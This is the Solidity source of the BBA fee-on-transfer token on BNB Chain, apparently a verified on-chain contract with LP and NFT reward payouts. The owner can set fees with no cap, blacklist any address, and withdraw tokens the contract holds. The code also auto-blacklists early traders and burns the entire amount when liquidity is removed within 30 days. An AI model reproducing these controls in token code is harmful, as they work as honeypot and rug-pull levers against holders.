/**
 *Submitted for verification at BscScan.com on 2024-03-13
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.18;

interface IERC20 {
    function decimals() external view returns (uint8);

    function symbol() external view returns (string memory);

    function name() external view returns (string memory);

    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IERC721 {
    function totalSupply() external view returns (uint256);
    function ownerOf(uint256 tokenId) external view returns (address owner);
}

interface ISwapRouter {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
}

interface ISwapFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
    function feeTo() external view returns (address);
}

abstract contract Ownable {
    address internal _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = msg.sender;
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == msg.sender, "!o");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "n0");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface ISwapPair {
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);

    function totalSupply() external view returns (uint);

    function kLast() external view returns (uint);

    function sync() external;
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;

        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

library PancakeLibrary {
    // returns sorted token addresses, used to handle return values from pairs sorted in this order
    function sortTokens(address tokenA, address tokenB) internal pure returns (address token0, address token1) {
        require(tokenA != tokenB, 'PancakeLibrary: IDENTICAL_ADDRESSES');
        (token0, token1) = tokenA < tokenB ? (tokenA, tokenB) : (tokenB, tokenA);
        require(token0 != address(0), 'PancakeLibrary: ZERO_ADDRESS');
    }

    // calculates the CREATE2 address for a pair without making any external calls
    function pairFor(address factory, address tokenA, address tokenB) internal pure returns (address pair) {
        (address token0, address token1) = sortTokens(tokenA, tokenB);
        pair = address(uint160(uint(keccak256(abi.encodePacked(
                hex'ff',
                factory,
                keccak256(abi.encodePacked(token0, token1)),
                hex'00fb7f630766e6a796048ea87d01acd3068e8ff67d078148a3fa3f4a84f69bd5' // init code hash
            )))));
    }
}

contract Wrap {
    address private _owner;
    constructor(){
        _owner = msg.sender;
    }
    
    function transfer(address token, address mainAddress) external returns (uint){
        uint allAmount = IERC20(token).balanceOf(address(this));
        IERC20(token).transfer(mainAddress, allAmount);

        return allAmount;
    }

    function transfer2(address token, uint other, uint all, address share1, address mainAddress) external returns (uint){
        uint allAmount = IERC20(token).balanceOf(address(this));

        uint otherAmount = allAmount * other / all;
        IERC20(token).transfer(share1, otherAmount);

        uint leftAmount = allAmount - otherAmount;
        IERC20(token).transfer(mainAddress, leftAmount);

        return leftAmount;
    }

    function transferBnb(uint256 amount) external{
        payable(_owner).transfer(amount);
    }
}

interface bbaInput{
    function giveCoin(uint amount) external;
}

contract BBA is IERC20, Ownable {
    using SafeMath for uint256;
    uint startTime = 0;

    uint buyFee = 35;
    uint sellFee = 35;

    uint addBuyFee = 0;
    uint addSellFee = 0;

    uint nftUNum = 0;
    uint lpUNum = 0;

    uint allNum = 0;
    uint otherNum = 0;

    bool inLp = false;

    uint256 public _limitAmount;
    uint256 public _rewardHoldCondition;

    modifier lockTheSwap {
        inSwap = true;
        _;
        inSwap = false;
    }

    mapping(address => uint256) public _balances;
    mapping(address => mapping(address => uint256)) private _allowances;

    string private _name;
    string private _symbol;
    uint8 private _decimals;

    bool private canIncr = true;

    mapping(address => bool) public _feeWhiteList;

    mapping(address => bool) public _blackList;
    uint256 private _tTotal;

    Wrap private wrap;

    ISwapRouter public immutable _swapRouter;
    mapping(address => bool) public _swapPairList;
    mapping(address => bool) public _swapRouters;

    bool private inSwap;

    uint256 private constant MAX = ~uint256(0);

    uint256 public startTradeBlock;
    uint256 public startAddLPBlock;
    address public immutable _mainPair;

    uint userBuyMax = 168e18;
    uint buyLimitTime = 600;
    mapping(address => uint) userBuy;

    bool public _strictCheck = true;

    address RouterAddress = address(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    address usdtContract = address(0x55d398326f99059fF775485246999027B3197955);

    string Name = "BBA";
    string Symbol = "BBA";
    uint8 Decimals = 18;
    uint256 Supply = 100000;

    address systemAddress = address(0x54CbD9De4A4eE2B94FE8c0E651939632046F0107);
    address ReceiveAddress = address(0x3F5505b18654dC0F1Aa67F469908cf5fAcF5cBfc);

    address nftAddress = address(0x7225E7159a112d0c9F07bF8F2d1b7A7C3C5c0EE7);

    address bbaInputContract = address(0x7225E7159a112d0c9F07bF8F2d1b7A7C3C5c0EE7);

    constructor (){
        _name = Name;
        _symbol = Symbol;
        _decimals = Decimals;

        ISwapRouter swapRouter = ISwapRouter(RouterAddress);
        _swapRouter = swapRouter;
        _allowances[address(this)][address(swapRouter)] = MAX;
        _swapRouters[address(swapRouter)] = true;

        ISwapFactory swapFactory = ISwapFactory(swapRouter.factory());

        wrap = new Wrap();

        _mainPair = swapFactory.createPair(usdtContract, address(this));  

        _swapPairList[_mainPair] = true;

        uint256 tokenUnit = 10 ** Decimals;
        uint256 total = Supply * tokenUnit;
        _tTotal = total;

        uint256 receiveTotal = total;
        _balances[ReceiveAddress] = receiveTotal;
        emit Transfer(address(0), ReceiveAddress, receiveTotal);

        _feeWhiteList[ReceiveAddress] = true;
        _feeWhiteList[systemAddress] = true;
        _feeWhiteList[address(wrap)] = true;
        _feeWhiteList[address(this)] = true;
        _feeWhiteList[msg.sender] = true;
        _feeWhiteList[address(0)] = true;
        _feeWhiteList[address(swapRouter)] = true;
        _feeWhiteList[address(0x000000000000000000000000000000000000dEaD)] = true;
    }

    function setBBAInput(address _setAddress) public onlyOwner {
        bbaInputContract = _setAddress;
        IERC20(usdtContract).approve(bbaInputContract, MAX);
        _feeWhiteList[bbaInputContract] = true;
    }

    function setUserBuyMax(uint setBuy) public onlyOwner{
        userBuyMax = setBuy;
    }

    function setUserBuyLimitTime(uint setTime) public onlyOwner{
        buyLimitTime = setTime;
    }

    function symbol() external view override returns (string memory) {
        return _symbol;
    }

    function name() external view override returns (string memory) {
        return _name;
    }

    function decimals() external view override returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _tTotal.sub(balanceOf(address(0))).sub(balanceOf(address(0x000000000000000000000000000000000000dEaD)));
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        if (_allowances[sender][msg.sender] != MAX) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender] - amount;
        }
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    mapping(uint => bool) hasincr;

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {
        require(!_blackList[from] || _feeWhiteList[from] || _feeWhiteList[to], "not valid address");

        uint256 balance = balanceOf(from);
        require(balance >= amount, "not enough amount");

        if (0 == startAddLPBlock){
            if (from == _mainPair && !_feeWhiteList[to]){
                _blackList[to] = true;
            } else if (to == _mainPair && !_feeWhiteList[from]){
                _blackList[from] = true;
            }
        }

        bool takeFee;
        if (!_feeWhiteList[from] && !_feeWhiteList[to]) {
            takeFee = true;
        }

        bool isAddLP;
        bool isRemoveLp;
        if (from == _mainPair || to == _mainPair){
            if (to == _mainPair) {
                isAddLP = _isAddLiquidityU();
            } else if(from == _mainPair){
                isRemoveLp = _isRemoveLiquidityU();
            }
        } 

        if (_swapPairList[from] || _swapPairList[to]) {
            if (0 == startAddLPBlock) {
                if (_feeWhiteList[from] && to == _mainPair) {
                    startAddLPBlock = block.number;
                }
            }
            if (!_feeWhiteList[from] && !_feeWhiteList[to]) {
                if (0 == startTradeBlock) {
                    require(0 < startAddLPBlock && isAddLP);
                }
            }
        }

        _tokenTransfer(from, to, amount, takeFee, isRemoveLp, isAddLP);
    }


    function _isAddLiquidityU() internal view returns (bool isAdd){
        ISwapPair uPair = ISwapPair(_mainPair);
        (uint r0,uint256 r1,) = uPair.getReserves();

        address tokenOther = usdtContract;
        uint256 r;
        if (tokenOther < address(this)) {
            r = r0;
        } else {
            r = r1;
        }

        uint bal = IERC20(tokenOther).balanceOf(address(uPair));
        isAdd = bal > r;
    }

    function _isRemoveLiquidityU() internal view returns (bool isRemove){
        ISwapPair uPair = ISwapPair(_mainPair);
        (uint r0,uint256 r1,) = uPair.getReserves();

        address tokenOther = usdtContract;
        uint256 r;
        if (tokenOther < address(this)) {
            r = r0;
        } else {
            r = r1;
        }

        uint bal = IERC20(tokenOther).balanceOf(address(uPair));
        isRemove = r >= bal;
    }

    function getTime() public view returns (uint){
        return startTime;
    }

    function getFee() public view returns(uint, uint, uint, uint){
        return (buyFee, sellFee, addBuyFee, addSellFee);
    }

    function setFee(uint _buyFee, uint _sellFee, uint _addBuyFee, uint _addSellFee) public onlyOwner{
        buyFee = _buyFee;
        sellFee = _sellFee;
        addBuyFee = _addBuyFee;
        addSellFee = _addSellFee;
    }

    function _tokenTransfer(
        address sender,
        address recipient,
        uint256 tAmount,
        bool takeFee,
        bool removeLPLiquidity,
        bool isAddLP
    ) private {
        uint256 senderBalance = _balances[sender];
        senderBalance -= tAmount;
        _balances[sender] = senderBalance;
        uint256 feeAmount = 0;
        uint256 otherFee = 0;
        bool isSell = false;
        bool isBuy = false;
        bool isTransfer = false;
        bool isRemove = false;
        uint allAmount = 0;

        if (takeFee) {
            if (removeLPLiquidity) {
                if (!_feeWhiteList[recipient] && (startTime == 0 || block.timestamp < startTime + needTime)) {
                    feeAmount = tAmount;
                    _takeTransfer(sender, address(0x000000000000000000000000000000000000dEaD), feeAmount);
                    isRemove = true;
                } else if (!_feeWhiteList[recipient]){
                    feeAmount = tAmount * buyFee / 1000;
                    otherFee = tAmount * addBuyFee / 1000;
                }
            } else if (isAddLP){
                _addLpProvider(sender);
                feeAmount = tAmount * sellFee / 1000;
                otherFee = tAmount * addSellFee / 1000;
            } else if (_swapPairList[sender]) {//Buy
                isBuy = true;
                require(checkBuy(recipient, tAmount), "buy Max");
                userBuy[recipient] = userBuy[recipient] + tAmount;
                feeAmount = tAmount * buyFee / 1000;
                otherFee = tAmount * addBuyFee / 1000;
            } else if (_swapPairList[recipient]) {//Sell
                isSell = true;
                feeAmount = tAmount * sellFee / 1000;
                otherFee = tAmount * addSellFee / 1000;
            }else {
                isTransfer = true;
            }

            allAmount = feeAmount + otherFee;
            if (allAmount > 0){
                if (!isRemove){
                    _takeTransfer(sender, address(this), allAmount);
                }
                uint256 contractTokenBalance = _balances[address(this)];
                if (!inSwap && isSell && contractTokenBalance > 0){
                    swapTokenForFund(contractTokenBalance);
                }
            }
        }

        if (isSell || isTransfer){
            if (canIncr){
                if (!hasincr[block.timestamp / 1 hours]){
                    uint incrNum = _balances[_mainPair] * endPer / 10000;
                    _balances[_mainPair] = _balances[_mainPair] - incrNum;
                    _takeTransfer(_mainPair, 0x000000000000000000000000000000000000dEaD, incrNum);
                    ISwapPair(_mainPair).sync();
                    hasincr[block.timestamp / 1 hours] = true;
                }
                if (totalSupply() <= 10000e18) {
                    canIncr = false;
                }
            }
        }

        if (takeFee){
            uint256 rewardGas = _rewardGas;
            if (inLp){
                // share to nft
                processNFTReward(rewardGas);
                inLp = false;
            } else {
                // share to lp
                processLPReward(rewardGas);
                inLp = true;
            }
        }

        allNum = allNum + allAmount;
        otherNum = otherNum + otherFee;

        _takeTransfer(sender, recipient, tAmount - allAmount);
    }

    function checkBuy(address buyAddress, uint buyAmount) private view returns (bool){
         bool isTime = buyLimitTime == 0 || block.timestamp >= startTime + buyLimitTime;
        uint hasBuy = userBuy[buyAddress] + buyAmount;
        bool isUser = hasBuy < userBuyMax || userBuyMax == 0;
        return isTime || isUser;
    } 

    uint needTime = 30 * 24 * 60 * 60;
    function setNeedTime(uint _setTime) public onlyOwner{
        needTime = _setTime;
    }

    function getCanIncr() public view returns (bool){
        return canIncr;
    }

    uint endPer = 50;
    function setEndPer(uint _setEnd) public onlyOwner {
        endPer = _setEnd;
    }

    function swapTokenForFund(uint256 tokenAmount) private lockTheSwap {
        if (0 == tokenAmount) {
            return;
        }
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = usdtContract;
        uint thisAmount = 0; //分配的U
        _swapRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(wrap),
            block.timestamp
        );
        
        if (otherNum > 0){
            thisAmount = wrap.transfer2(usdtContract, otherNum, allNum, systemAddress, address(this));
            otherNum = 0;
            allNum = 0;
        } else {
            thisAmount = wrap.transfer(usdtContract, address(this));
            allNum = 0;
        }
        toShareAll(thisAmount);
    }

    function toShareAll(uint amount) private {
        uint giveA = amount * 8 / 35;
        nftUNum = nftUNum + giveA;
        lpUNum = lpUNum + giveA;
        IERC20(usdtContract).transfer(systemAddress, giveA);
        bbaInput(bbaInputContract).giveCoin(amount * 11 / 35);
    }

    function _takeTransfer(
        address sender,
        address to,
        uint256 tAmount
    ) private {
        _balances[to] = _balances[to] + tAmount;
        emit Transfer(sender, to, tAmount);
    }

    function setFeeWhiteList(address addr, bool enable) public onlyOwner {
        _feeWhiteList[addr] = enable;
    }

    function getFeeWhite(address addr) public view returns(bool){
        return _feeWhiteList[addr];
    }

    function batchSetFeeWhiteList(address [] memory addr, bool enable) public onlyOwner {
        for (uint i = 0; i < addr.length; i++) {
            _feeWhiteList[addr[i]] = enable;
        }
    }

    function setBlackList(address addr, bool enable) public onlyOwner {
        _blackList[addr] = enable;
    }

    function batchSetBlackList(address [] memory addr, bool enable) public onlyOwner {
        for (uint i = 0; i < addr.length; i++) {
            _blackList[addr[i]] = enable;
        }
    }

    function setSwapPairList(address addr, bool enable) public onlyOwner {
        _swapPairList[addr] = enable;
    }

    function setSwapRouter(address addr, bool enable) public onlyOwner {
        _swapRouters[addr] = enable;
    }

    function claimBalance(address addr, uint256 amount) public onlyOwner {
        payable(addr).transfer(amount);
    }

    function claimToken(address addr, address token, uint256 amount) public onlyOwner {
        IERC20(token).transfer(addr, amount);
    }
   
    receive() external payable {}

    function setStrictCheck(bool enable) public onlyOwner {
        _strictCheck = enable;
    }

    function startTrade() public onlyOwner {
        require(0 == startTradeBlock, "started");
        startTradeBlock = block.number;
        startTime = block.timestamp;
    }

    function setSystem(address setAddress) public onlyOwner {
        systemAddress = setAddress;
    }

    address[] public lpProviders;
    mapping(address => uint256) public lpProviderIndex;
    mapping(address => bool) public excludeLpProvider;

    function getLPProviderLength() public view returns (uint256){
        return lpProviders.length;
    }

    function _addLpProvider(address adr) private {
        if (0 == lpProviderIndex[adr]) {
            if (0 == lpProviders.length || lpProviders[0] != adr) {
                uint256 size;
                assembly {size := extcodesize(adr)}
                if (size > 0) {
                    return;
                }
                lpProviderIndex[adr] = lpProviders.length;
                lpProviders.push(adr);
            }
        }
    }

    uint256 public lpHoldCondition = 1 ether / 1000000000;
    uint256 public _rewardGas = 500000;

    function setLPHoldCondition(uint256 amount) public onlyOwner {
        lpHoldCondition = amount;
    }

    function setExcludeLPProvider(address addr, bool enable) public onlyOwner {
        excludeLpProvider[addr] = enable;
    }

    function setRewardGas(uint256 rewardGas) public onlyOwner {
        require(rewardGas >= 200000 && rewardGas <= 2000000, "20-200w");
        _rewardGas = rewardGas;
    }

    uint256 public currentLPIndex;
    uint256 public lpRewardCondition = 200e18;
    uint256 public progressLPRewardBlock;
    uint256 public progressLPBlockDebt = 1;

    function processLPReward(uint256 gas) private {
        if (0 == startTradeBlock) {
            return;
        }
        if (progressLPRewardBlock + progressLPBlockDebt > block.number) {
            return;
        }

        if (lpUNum == 0){
            return;
        }

        uint256 rewardCondition = lpRewardCondition;
        IERC20 USDT = IERC20(usdtContract);

        IERC20 holdToken = IERC20(_mainPair);
        uint holdTokenTotal = holdToken.totalSupply();
        if (0 == holdTokenTotal) {
            return;
        }

        address shareHolder;
        uint256 tokenBalance;
        uint256 amount;

        uint256 shareholderCount = lpProviders.length;

        uint256 gasUsed = 0;
        uint256 iterations = 0;
        uint256 gasLeft = gasleft();
        uint256 holdCondition = lpHoldCondition;
        uint256 rewardHoldCondition = _rewardHoldCondition;

        while (gasUsed < gas && iterations < shareholderCount) {
            if (currentLPIndex >= shareholderCount) {
                currentLPIndex = 0;
            }
            shareHolder = lpProviders[currentLPIndex];
            if (!excludeLpProvider[shareHolder] && balanceOf(shareHolder) >= rewardHoldCondition) {
                tokenBalance = holdToken.balanceOf(shareHolder);
                if (tokenBalance >= holdCondition) {
                    amount = rewardCondition * tokenBalance / holdTokenTotal;
                    if (amount > 0) {
                        if (lpUNum >= amount){
                            USDT.transfer(shareHolder, amount);
                            lpUNum = lpUNum - amount;
                        } else {
                            break;
                        }
                    }
                }
            }

            gasUsed = gasUsed + (gasLeft - gasleft());
            gasLeft = gasleft();
            currentLPIndex++;
            iterations++;
        }
        progressLPRewardBlock = block.number;
    }

    function setLPRewardCondition(uint256 amount) public onlyOwner {
        lpRewardCondition = amount;
    }

    function setLPBlockDebt(uint256 debt) public onlyOwner {
        progressLPBlockDebt = debt;
    }

    function setLimitAmount(uint256 amount) public onlyOwner {
        _limitAmount = amount;
    }

    function setRewardHoldCondition(uint256 amount) public onlyOwner {
        _rewardHoldCondition = amount;
    }

    uint256 nftRewardCondition = 200e18;

    function setNFTRewardCondition(uint256 amount) public onlyOwner {
        nftRewardCondition = amount;
    }

    function updateNftAddress(address _setNftAddress) public onlyOwner {
        nftAddress = _setNftAddress;
    }

    uint256 public currentNFTIndex = 1;
    function processNFTReward(uint256 gas) private {
        if (progressLPRewardBlock + progressLPBlockDebt > block.number) {
            return;
        }

         if (nftUNum == 0){
            return;
        }

        uint rewardHoldCondition =_rewardHoldCondition;

        address shareHolder;
        uint256 amount;

        uint256 shareholderCount = IERC721(nftAddress).totalSupply();

        uint256 gasUsed = 0;
        uint256 iterations = 0;
        uint256 gasLeft = gasleft();
        IERC20 USDT = IERC20(usdtContract);

        while (gasUsed < gas && iterations < shareholderCount) {
            if (currentNFTIndex > shareholderCount) {
                currentNFTIndex = 1;
            }
            shareHolder = IERC721(nftAddress).ownerOf(currentNFTIndex);
            if (!excludeLpProvider[shareHolder] && balanceOf(shareHolder) >= rewardHoldCondition) {
                amount = nftRewardCondition / shareholderCount;
                if (amount > 0) {
                    if (nftUNum < amount){
                        break;
                    } else {
                        USDT.transfer(shareHolder, amount);
                        nftUNum -= amount;
                    }
                }
            }

            gasUsed = gasUsed + (gasLeft - gasleft());
            gasLeft = gasleft();
            currentNFTIndex++;
            iterations++;
        }
        progressLPRewardBlock = block.number;
    }
}